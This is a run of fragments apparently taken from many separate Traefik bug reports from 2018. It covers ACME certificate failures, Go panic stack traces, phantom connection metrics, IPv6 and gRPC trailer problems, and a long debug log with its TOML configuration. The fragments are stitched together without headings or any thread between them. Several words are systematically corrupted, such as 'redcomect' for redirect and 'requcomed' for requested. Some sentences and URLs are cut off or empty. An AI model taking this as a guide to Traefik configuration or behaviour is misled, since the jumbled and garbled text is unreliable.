\\t/go/src/github.com/containous/traefik/safe/routine.go:142 + \ created by github.com/containous/traefik/safe.gowithrecover\ \\t/go/src/github.com/containous/traefik/safe/routine.go:136 + \ ","time":"2018-12-18t21:11:44z"}
{"level":"error","msg":"provider connection error: panic in operation: %!s(\\u003cnil\\u003e); retrying in 749.594306ms","time":"2018-12-18t21:11:44z"}
randomly assigned networks on backends: <details> ![image]( </details>
empty values at the consul
tls validations errors from anything that wasn't consul related, including external resources for acme tls validation processes, as follows: ```
dec 04 10:03:50 traefik traefik[38168]: time="2018-12-04t10:03:50-05:00" level=warning msg="error checking new version: get x509:
certificate signed by unknown authority"
``` and: ```
dec 04 09:54:13 traefik traefik[38168]: time="2018-12-04t09:54:13-05:00" level=error msg="error getting acme certificate for domain [\\"*.deckersheaven.com\\"]: cannot obtain certificates: acme: error -> one or more domains had a problem:\ [deckersheaven.com] error presenting token: route53: failed to determine hosted zone id: requesterror: send request failed\ caused by: get x509: certificate signed by unknown authority\ "
traefik routed requests to tasks in the pending state, resulting in request timeouts
as a result, every 15 minutes (aws attempted to start the task every 15 min), we saw a high volume of requests to this service timeout.
the request arrived at the backend containing the trailing slash
causing a 404 response
~ curl -si | head -n1
http/1.1 404 not found
~ curl -si | head -n1
http/1.1 200 ok
``` ### traefik version ```
version: dev
codename: cheddar
go version: go1.11.2
built: i don't remember exactly
os/arch: darwin/amd64
reported as `1.7.4` in `/dashboard`
installed via `brew install traefik`
wanted to use a docker image but couldn't get host networking set up
### environment see above ### debug logs
- traefik leaking memory and eventually being killed by oom killer
the prometheus metrics indicate the presence of phantom connections
see prometheus output from a cluster below which indicates 5 open connections on one instance and 1 on another:
traefik_entrypoint_open_connections{entrypoint="https",instance="api-xyz:6443",job="kubernetes-pods-xyz",kubernetes_namespace="kube-system",kubernetes_pod_controller_kind="daemonset",kubernetes_pod_controller_name="traefik-ingress-controller",kubernetes_pod_name="traefik-ingress-controller-fts2g",method="track",protocol="http"} 2
traefik_entrypoint_open_connections{entrypoint="http",instance="api-xyz:6443",job="kubernetes-pods-xyz",kubernetes_namespace="kube-system",kubernetes_pod_controller_kind="daemonset",kubernetes_pod_controller_name="traefik-ingress-controller",kubernetes_pod_name="traefik-ingress-controller-r48zm",method="trace",protocol="http"} 1
traefik_entrypoint_open_connections{entrypoint="https",instance="api-xyz:6443",job="kubernetes-pods-xyz",kubernetes_namespace="kube-system",kubernetes_pod_controller_kind="daemonset",kubernetes_pod_controller_name="traefik-ingress-controller",kubernetes_pod_name="traefik-ingress-controller-fts2g",method="get",protocol="http"} 1
traefik_entrypoint_open_connections{entrypoint="https",instance="api-xyz:6443",job="kubernetes-pods-xyz",kubernetes_namespace="kube-system",kubernetes_pod_controller_kind="daemonset",kubernetes_pod_controller_name="traefik-ingress-controller",kubernetes_pod_name="traefik-ingress-controller-fts2g",method="post",protocol="http"} 1
traefik_entrypoint_open_connections{entrypoint="https",instance="api-xyz:6443",job="kubernetes-pods-xyz",kubernetes_namespace="kube-system",kubernetes_pod_controller_kind="daemonset",kubernetes_pod_controller_name="traefik-ingress-controller",kubernetes_pod_name="traefik-ingress-controller-fts2g",method="get",protocol="websocket"} 1
``` now compare to `lsof` output of the traefik process corresponding to **traefik-ingress-controller-fts2g**: ```
$ sudo lsof -p $(pgrep traefik)
command pid user fd type device size/off node name
traefik 156241 root cwd dir 0,111 127 2 /
traefik 156241 root rtd dir 0,111 127 2 /
traefik 156241 root txt reg 0,111 67387168 25 /traefik
traefik 156241 root 0r fifo 0,10 0t0 17261110 pipe
traefik 156241 root 1w fifo 0,10 0t0 17261111 pipe
traefik 156241 root 2w fifo 0,10 0t0 17261112 pipe
traefik 156241 root 3u ipv6 17373888 0t0 tcp *:https (listen)
traefik 156241 root 4u a_inode 0,11 0 12178 [eventpoll]
traefik 156241 root 5u ipv6 17373889 0t0 tcp *:http (listen)
traefik 156241 root 6u ipv6 17373890 0t0 tcp *:9301 (listen)
traefik 156241 root 8u ipv4 17401391 0t0 tcp node-1:45568->10.96.0.1:https (established)
traefik 156241 root 9u ipv6 116863254 0t0 tcp node-1:https->node-2:51700 (established)
traefik 156241 root 10u ipv4 116863256 0t0 tcp node-1:44468->kube-state-metrics:http-alt (established)
traefik 156241 root 12u ipv6 320210977 0t0 tcp node-1:9301->node-3:38950 (established)
``` `lsof` here indicates, in order:
* a connection with the kubernetes api server
* a connection with the prometheus scrape server (probably scraping ksm through an ingress)
* a connection with kube-state-metrics
* a connection with the kubernetes api server for metrics scraping other traefik instances in different kubernetes clusters show similar behavior, but the count and disposition of open connections being reported in the prometheus metrics varies
as i write this, another 2 clusters with similar configuration to the one i pulled metrics from above are each showing 1 consistently open connection (all are being monitored identically from the same prometheus instance).
each of the `whoami` containers existed under their own backend.
internal server error
- wget -> works
- wget -6 -> fails with error "invalid argument."
- wget -4 -> works
- ping whoami.my.domain.com -> works
- ping6 whoami.my.domain.com -> works
- telnet -4 whoami.my.domain.com 22 -> works (sshd listening)
- telnet -6 whoami.my.domain.com 22 -> works (sshd listening)
- telnet -4 whoami.my.domain.com 443 -> works (traefik listening)
- telnet -6 whoami.my.domain.com 443 -> fails (traefik failing) additionally we've conducted tests in ipv6 networks (e.g
deutsche telekom, vodafone) which lead to the observed error .
the browser connects to traefik without any issue, but only receives the 'internal server error' result that means a backend is unavailable/misconfigured
in the logs, it mentions not trusting the self-signed cert's provider
the backend is up and reachable at the exposed port from the docker image.
time="2018-11-15t19:58:23z" level=info msg="legolog: [info] [*.some.subdomain.tld, some.subdomain.tld] acme: obtaining bundled san certificate"
time="2018-11-15t19:58:24z" level=info msg="legolog: [info] [*.some.subdomain.tld] authurl: "
time="2018-11-15t19:58:24z" level=info msg="legolog: [info] [some.subdomain.tld] authurl: "
time="2018-11-15t19:58:24z" level=info msg="legolog: [info] [some.subdomain.tld] acme: could not find solver for: http-01"
time="2018-11-15t19:58:24z" level=info msg="legolog: [info] [some.subdomain.tld] acme: could not find solver for: tls-alpn-01"
time="2018-11-15t19:58:24z" level=info msg="legolog: [info] [some.subdomain.tld] acme: preparing to solve dns-01"
time="2018-11-15t19:58:24z" level=error msg="error in go routine: runtime error: invalid memory address or nil pointer dereference"
time="2018-11-15t19:58:24z" level=error msg="stack: goroutine 74 [running]:\ runtime/debug.stack( , , )\ \\t/usr/local/go/src/runtime/debug/stack.go:24 + \ github.com/containous/traefik/safe.defaultrecovergoroutine( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:148 + \ github.com/containous/traefik/safe.operationwithrecover.func1.1( )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:156 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:513 + \ github.com/containous/traefik/vendor/github.com/xenolf/lego/providers/dns/cloudflare.(*dnsprovider).present( , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/providers/dns/cloudflare/cloudflare.go:134 + \ github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*dnschallenge).presolve( , , , , , , , , , , ...)\ \\t/go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/dns_challenge.go:102 + \ github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).solvechallengeforauthz( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:603 + \ github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...)\ \\t/go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:437 + \ github.com/containous/traefik/provider/acme.obtaincertificatewithretry.func1( , )\ \\t/go/src/github.com/containous/traefik/provider/acme/provider.go:487 + \ github.com/containous/traefik/safe.operationwithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:160 + \ github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 + \ github.com/containous/traefik/provider/acme.obtaincertificatewithretry( , , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/acme/provider.go:501 + \ github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/acme/provider.go:411 + \ github.com/containous/traefik/provider/acme.(*provider).provide.func1()\ \\t/go/src/github.com/containous/traefik/provider/acme/provider.go:186 + \ github.com/containous/traefik/safe.gowithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:142 + \ created by github.com/containous/traefik/safe.gowithrecover\ \\t/go/src/github.com/containous/traefik/safe/routine.go:136 + \ "
time="2018-11-15t19:58:24z" level=error msg="error obtaining certificate retrying in 326.61237ms"
repeated logging every 5 seconds and eventually traefik stops responding to service/config changes (but continues serving)
in all cases, the traefik dashboard and whatever ingress i add works (even if i have to delete traefik to make it see the new service).
case 2) was pinging `/primus` without parameters
case 1) and 1') converted `?` and `&`, result in `/primus%3faccess_token=healthcheck&transport=polling`
after enabling grpc debug log on client, i can clearly see what's going on.
with successful response from server, headers are parsed correctly:
i1109 15:47:48.227941505 31097 parsing.cc:624] parsing initial_metadata
i1109 15:47:48.228010139 31097 hpack_parser.cc:636] decode: ':status: 200', elem_interned=1 [3], k_interned=1, v_interned=1
i1109 15:47:48.228026784 31097 parsing.cc:406] http:7:hdr:cli: :status: 32 30 30 '200'
i1109 15:47:48.228036516 31097 hpack_parser.cc:636] decode: 'accept-encoding: identity,gzip', elem_interned=1 [3], k_interned=1, v_interned=1
more headers parsing like content-type etc.)
i1109 15:47:48.228194491 31097 parsing.cc:629] parsing trailing_metadata
i1109 15:47:48.228204788 31097 hpack_parser.cc:636] decode: 'grpc-message: ok', elem_interned=1 [1], k_interned=1, v_interned=1
i1109 15:47:48.228211996 31097 parsing.cc:488] http:7:trl:cli: grpc-message: 4f 4b 'ok'
i1109 15:47:48.228222807 31097 hpack_parser.cc:636] decode: 'grpc-status: 0', elem_interned=1 [3], k_interned=1, v_interned=1
i1109 15:47:48.228231082 31097 parsing.cc:488] http:7:trl:cli: grpc-status: 30 '0'
``` with error response:
i1109 15:48:27.931384221 31097 parsing.cc:617] parsing trailers-only
i1109 15:48:27.931449261 31097 hpack_parser.cc:636] decode: ':status: 200', elem_interned=1 [3], k_interned=1, v_interned=1
i1109 15:48:27.931467406 31097 parsing.cc:488] http:9:trl:cli: :status: 32 30 30 '200'
i1109 15:48:27.931481383 31097 hpack_parser.cc:636] decode: 'accept-encoding: identity,gzip', elem_interned=1 [3], k_interned=1, v_interned=1
i1109 15:48:27.931491598 31097 parsing.cc:488] http:9:trl:cli: accept-encoding: 69 64 65 6e 74 69 74 79 2c 67 7a 69 70 'identity,gzip'
i1109 15:48:27.931503401 31097 hpack_parser.cc:636] decode: 'content-type: application/grpc', elem_interned=1 [3], k_interned=1, v_interned=1
i1109 15:48:27.931523249 31097 parsing.cc:488] http:9:trl:cli: content-type: 61 70 70 6c 69 63 61 74 69 6f 6e 2f 67 72 70 63 'application/grpc'
``` as you can see, "normal" headers are in place of "tailers"
(or just those original tailers are skipped? e.g
grpc-status header)
1 frontend with only 1 backend.
marathon provider crashed
all frontends and backends were removed and traefik returns just `404` for all requests
time="2018-11-07t20:14:07z" level=error msg="error when creating error page \\"web\\" for frontend \\"frontend-web-dev\\": the backend \\"backend-error\\" doesn\'t exist."
time="2018-11-07t20:14:07z" level=info msg="server configuration reloaded on :8080"
time="2018-11-07t20:14:07z" level=info msg="server configuration reloaded on :8081"
time="2018-11-07t20:14:07z" level=info msg="server configuration reloaded on :10118"
time="2018-11-07t20:14:07z" level=info msg="skipping same configuration for provider marathon"
also, there is a strange conveniton that forces you to name the error page backend with a dash at the begining
otherwise the backend can't be found.
> a reverse proxy / load balancer that's easy, dynamic, automatic, fast, full-featured, open source, production proven, provides metrics, and **integrates with every major cluster technologies**..
i would expect to see "integrates with all major cluster technologies" or "integrates with every major cluster technology".
nov 02 15:53:52 host traefik[2916]: time="2018-11-02t15:53:52+01:00" level=error msg="error parsing authenticator user: ##################################
skipping frontend frontend1..."
`service1`, `servicea` ### traefik version: docker `v1.7.3` alpine on marathon
it looks like the acme code expects to be able to upsert txt records but googles api doesn't allow it
see log output below.
wrong certificate offered with requests to different.domain.net (it looks like is always returning the default certificate since flipping configuration order also flip the results)
time="2018-10-31t10:55:16z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [mydomain.online] error presenting token: rfc2136: dial udp: lookup \\"mydomain.online\\": no such `host\ "
time="2018-10-31t10:55:16z" level=error msg="unable to obtain acme certificate for domains \\"*.mydomain.online,mydomain.online\\" : unable to generate a certificate for the domains [*.mydomain.online mydomain.online]: acme: error -> one or more domains had a problem:\ [mydomain.online] error presenting token: rfc2136: dial udp: lookup \\"mydomain.online\\": no such host\ "
i can see in the logs that it tries to get acme certificates for internal services, even though those services already have a provided certificate
it's worth noting that everything still works as expected
the internal services use the self signed wildcard certificate while external domains get acme certfificates
i just don't like that traefik attempts to generate certificates for them, because i'm afraid to hit the rate limiting.
an error message in the traefik logs and the traefik default cert instead of a valid one
time="2018-10-28t15:02:20z" level=error msg="unable to obtain acme certificate for domains \\"*.mydomain.de,mydomain.de\\" : unable to generate a certificate for the domains [*.mydomain.de mydomain.de]: acme: error -> one or more domains had a problem:\ [mydomain.de] error presenting token: netcup: error decoding response of dns-api, json: cannot unmarshal string into go struct field responsemsg.responsedata of type netcup.responsedata\ "
info[2018-10-25t09:24:43+03:00] preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
fata[2018-10-25t09:24:44+03:00] error preparing server: error opening listener: listen tcp :443: bind: address already in use
a command that isnt possible to execute because of weird unicode chars in it.
error obtaining certificate: acme: error -> one or more domains had a problem:\ [monitor.local.example.com] error presenting token: digitalocean: could not determine zone for domain: 'monitor.local.example.com'
unexpected response code 'notimpl' for monitor.local.example.com
i get 200 response and the request is not redirected ### output of `traefik version`: ```
version: v1.7.3
codename: maroilles
go version: go1.11.1
built: 2018-10-15_10:13:00am
os/arch: linux/amd64
``` ### what is your environment & configuration? ```toml
debug = true defaultentrypoints = ["https","http"] [api] dashboard = true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [retry] [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "example.com"
watch = true
exposedbydefault = false [acme]
email = "dev@example.com"
storage = "acme.json"
onhostrule = true
caserver = " "
entrypoint = "https" [acme.httpchallenge] entrypoint = "http" [[acme.domains]] main = "foo.example.com" ``` ### the log output in debug level: ``` time="2018-10-21t15:30:13z" level=info msg="using toml configuration file /traefik.toml"
time="2018-10-21t15:30:13z" level=info msg="traefik version v1.7.3 built on 2018-10-15_10:13:00am"
time="2018-10-21t15:30:13z" level=debug msg="global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":10000000000},"gracetimeout":0,"debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"tracing":null,"loglevel":"","entrypoints":{"http":{"address":":80","tls":null,"redcomect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"https":{"address":":443","tls":{"minversion":"","ciphersuites":null,"certificates":null,"clientcafiles":null,"clientca":{"files":null,"optional":false},"defaultcertificate":null,"snistrict":false},"redcomect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"address":":8080","tls":null,"redcomect":null,"auth":null,"whitelistsourcerange":null,"whitelist":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":{"email":"dev@example.com","domains":[{"main":"foo.example.com","sans":null}],"storage":"acme.json","storagefile":"","ondemand":false,"onhostrule":true,"caserver":" ","entrypoint":"https","keytype":"","dnschallenge":null,"httpchallenge":{"entrypoint":"http"},"tlschallenge":null,"dnsprovider":"","delaydontcheckdns":0,"acmelogging":false,"overridecertificates":false,"tlsconfig":null},"defaultentrypoints":["https","http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":{"attempts":0},"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"allowminweightzero":false,"web":null,"docker":{"watch":true,"filename":"","constraints":null,"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"example.com","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false,"network":""},"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":true,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":null,"hostresolver":null}"
time="2018-10-21t15:30:13z" level=info msg="nstats collection is disabled.nhelp us improve traefik by turning this feature on :)nmore details on: #collected-datan"
time="2018-10-21t15:30:13z" level=debug msg="setting acme certificate store from entrypoint: https"
time="2018-10-21t15:30:13z" level=info msg="preparing server http &{address::80 tls:<nil> redcomect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-21t15:30:13z" level=info msg="preparing server https &{address::443 tls: redcomect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-21t15:30:13z" level=info msg="starting server on :80"
time="2018-10-21t15:30:14z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redcomect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-21t15:30:14z" level=info msg="starting server on :443"
time="2018-10-21t15:30:14z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-10-21t15:30:14z" level=info msg="starting server on :8080"
time="2018-10-21t15:30:14z" level=info msg="starting provider *docker.provider {"watch":true,"filename":"","constraints":null,"trace":false,"templateversion":2,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"example.com","tls":null,"exposedbydefault":false,"usebindportip":false,"swarmmode":false,"network":""}"
time="2018-10-21t15:30:14z" level=info msg="starting provider *acme.provider {"email":"dev@example.com","acmelogging":false,"caserver":" ","storage":"acme.json","entrypoint":"https","keytype":"","onhostrule":true,"ondemand":false,"dnschallenge":null,"httpchallenge":{"entrypoint":"http"},"tlschallenge":null,"domains":[{"main":"foo.example.com","sans":null}],"store":{}}"
time="2018-10-21t15:30:14z" level=info msg="testing certificate renew..."
time="2018-10-21t15:30:14z" level=debug msg="configuration received from provider acme: {}"
time="2018-10-21t15:30:14z" level=debug msg="provider connection established with docker 17.03.1-ce (api 1.27)"
time="2018-10-21t15:30:14z" level=debug msg="looking for provided certificate(s) to validate ["foo.example.com"]..."
time="2018-10-21t15:30:14z" level=debug msg="no acme certificate generation requcomed for domains ["foo.example.com"]."
time="2018-10-21t15:30:14z" level=debug msg="filtering disabled container /traefik_reverse-proxy_1"
time="2018-10-21t15:30:14z" level=debug msg="originlabelsmap[traefik.frontend.headers.sslhost:foo.example.com traefik.frontend.headers.ssltemporaryredcomect:true traefik.port:80 com.docker.compose.version:1.18.0 org.label-schema.build-date:2018-10-21t13:17:11z org.label-schema.vcs-ref:f2246d136931e2b1d757a752b46756845627410f traefik.docker.network:web traefik.frontend.headers.sslforcehost:true com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:web traefik.enable:true com.docker.compose.config-hash:243380275c52ca4cc358b3c4273a1378158361e2dbfe82bf5ef81c6721a4e6ad org.label-schema.vcs-url: traefik.frontend.headers.sslredcomect:true traefik.frontend.rule:host:foo.example.com,www.foo.example.com com.docker.compose.service:web maintainer:nginx docker maintainers <docker-maint@nginx.com> traefik.protocol:http]"
time="2018-10-21t15:30:14z" level=debug msg="alllabelsmap[:map[traefik.frontend.headers.sslhost:foo.example.com traefik.frontend.headers.ssltemporaryredcomect:true traefik.frontend.headers.sslforcehost:true traefik.frontend.headers.sslredcomect:true traefik.frontend.rule:host:foo.example.com,www.foo.example.com traefik.protocol:http traefik.docker.network:web traefik.port:80 traefik.enable:true]]" time="2018-10-21t15:30:14z" level=debug msg="originlabelsmap[traefik.frontend.headers.ssltemporaryredcomect:true traefik.port:80 com.docker.compose.version:1.18.0 org.label-schema.build-date:2018-10-21t13:17:11z org.label-schema.vcs-ref:f2246d136931e2b1d757a752b46756845627410f traefik.docker.network:web traefik.frontend.headers.sslhost:foo.example.com com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:web traefik.enable:true traefik.frontend.headers.sslforcehost:true com.docker.compose.config-hash:243380275c52ca4cc358b3c4273a1378158361e2dbfe82bf5ef81c6721a4e6ad org.label-schema.vcs-url: traefik.frontend.headers.sslredcomect:true traefik.frontend.rule:host:foo.example.com,www.foo.example.com com.docker.compose.service:web maintainer:nginx docker maintainers <docker-maint@nginx.com> traefik.protocol:http]"
time="2018-10-21t15:30:14z" level=debug msg="alllabelsmap[:map[traefik.frontend.headers.sslredcomect:true traefik.enable:true traefik.frontend.rule:host:foo.example.com,www.foo.example.com traefik.docker.network:web traefik.frontend.headers.sslhost:foo.example.com traefik.frontend.headers.ssltemporaryredcomect:true traefik.port:80 traefik.frontend.headers.sslforcehost:true traefik.protocol:http]]"
time="2018-10-21t15:30:14z" level=debug msg="backend backend-web-web: no load-balancer defined, fallback to \'wrr\' method"
time="2018-10-21t15:30:14z" level=debug msg="add certificate for domains foo.example.com"
time="2018-10-21t15:30:14z" level=debug msg="add certificate for domains foo.example.com,www.foo.example.com"
time="2018-10-21t15:30:14z" level=info msg="server configuration reloaded on :80"
time="2018-10-21t15:30:14z" level=info msg="server configuration reloaded on :443"
time="2018-10-21t15:30:14z" level=info msg="server configuration reloaded on :8080"
time="2018-10-21t15:30:15z" level=debug msg="wcoming frontend frontend-host-foo-example-com-www-foo-example-com-0 to entrypoint https"
time="2018-10-21t15:30:15z" level=debug msg="creating backend backend-web-web"
time="2018-10-21t15:30:15z" level=debug msg="adding secure middleware for frontend frontend-host-foo-example-com-www-foo-example-com-0"
time="2018-10-21t15:30:15z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-foo-example-com-www-foo-example-com-0"
time="2018-10-21t15:30:15z" level=debug msg="creating load-balancer wrr"
time="2018-10-21t15:30:15z" level=debug msg="creating server server-web-web-1-50454c5050fec61e79f56fc0d166926c at with weight 1"
time="2018-10-21t15:30:15z" level=debug msg="creating retries max attempts 1"
time="2018-10-21t15:30:15z" level=debug msg="creating route route-frontend-host-foo-example-com-www-foo-example-com-0 host:foo.example.com,www.foo.example.com"
time="2018-10-21t15:30:15z" level=debug msg="wcoming frontend frontend-host-foo-example-com-www-foo-example-com-0 to entrypoint http"
time="2018-10-21t15:30:15z" level=debug msg="creating backend backend-web-web"
time="2018-10-21t15:30:15z" level=debug msg="adding secure middleware for frontend frontend-host-foo-example-com-www-foo-example-com-0"
time="2018-10-21t15:30:15z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-foo-example-com-www-foo-example-com-0"
time="2018-10-21t15:30:15z" level=debug msg="creating load-balancer wrr"
time="2018-10-21t15:30:15z" level=debug msg="creating server server-web-web-1-50454c5050fec61e79f56fc0d166926c at with weight 1"
time="2018-10-21t15:30:15z" level=debug msg="creating retries max attempts 1"
time="2018-10-21t15:30:15z" level=debug msg="creating route route-frontend-host-foo-example-com-www-foo-example-com-0 host:foo.example.com,www.foo.example.com"
time="2018-10-21t15:30:15z" level=debug msg="creating load-balancer wrr"
time="2018-10-21t15:30:15z" level=debug msg="creating retries max attempts 1"
time="2018-10-21t15:30:15z" level=debug msg="creating load-balancer wrr"
time="2018-10-21t15:30:15z" level=debug msg="creating retries max attempts 1"
time="2018-10-21t15:30:15z" level=debug msg="add certificate for domains foo.example.com"
time="2018-10-21t15:30:15z" level=debug msg="add certificate for domains foo.example.com,www.foo.example.com"
time="2018-10-21t15:30:15z" level=info msg="server configuration reloaded on :80"
time="2018-10-21t15:30:15z" level=info msg="server configuration reloaded on :443"
time="2018-10-21t15:30:15z" level=info msg="server configuration reloaded on :8080"
time="2018-10-21t15:30:15z" level=debug msg="try to challenge certificate for domain [foo.example.com www.foo.example.com] founded in host rule"
time="2018-10-21t15:30:15z" level=debug msg="looking for provided certificate(s) to validate ["foo.example.com" "www.foo.example.com"]..."
time="2018-10-21t15:30:15z" level=debug msg="no acme certificate generation requcomed for domains ["foo.example.com" "www.foo.example.com"]." time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/roundrobin/rr: begin servehttp on request" request="{"method":"head","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}"
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/roundrobin/rr: forwarding this request to url" request="{"method":"head","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}" forwardurl=" "
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{"method":"head","url":{"scheme":"http","opaque":"","user":null,"host":"172.22.0.6:80","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}"
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{"method":"head","url":{"scheme":"http","opaque":"","user":null,"host":"172.22.0.6:80","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}"
time="2018-10-21t15:30:20z" level=debug msg="upstream responsewriter of type *pipelining.writerwithoutclosenotify does not implement http.closenotifier
returning dummy channel."
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 200, length: 0, duration: 1.908896ms tls:version: 303, tls:resume:false, tls:csuite:c02f, tls:server:www.foo.example.com"
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{"method":"head","url":{"scheme":"http","opaque":"","user":null,"host":"172.22.0.6:80","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}"
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{"method":"head","url":{"scheme":"http","opaque":"","user":null,"host":"172.22.0.6:80","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}"
time="2018-10-21t15:30:20z" level=debug msg="vulcand/oxy/roundrobin/rr: completed servehttp on request" request="{"method":"head","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"accept":["*/*"],"user-agent":["curl/7.47.0"]},"contentlength":0,"transferencoding":null,"host":"www.foo.example.com","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"2.176.121.98:48760","requesturi":"/","tls":null}" ```
traefik redirected the request to ` ` removing the `pathprefixstrip` properly redirects the request.
the frontend rule is missing in the api and dashboard
this results in a "non functioning" frontend in the dashboard and api result
### additional details it appears that the key for the frontend/backend is `host + path` when host _and_ path are empty, this may end up being "unparseable"
unknown entrypoint \\"\\" for acme configuration
time="2018-10-17t09:02:04z" level=error msg="failed to retrieve information of the docker client and server host: cannot connect to the docker daemon at unix:///var/run/docker.sock
is the docker daemon running?"
time="2018-10-17t09:02:04z" level=error msg="provider connection error cannot connect to the docker daemon at unix:///var/run/docker.sock
is the docker daemon running?, retrying in 3.6780511s"
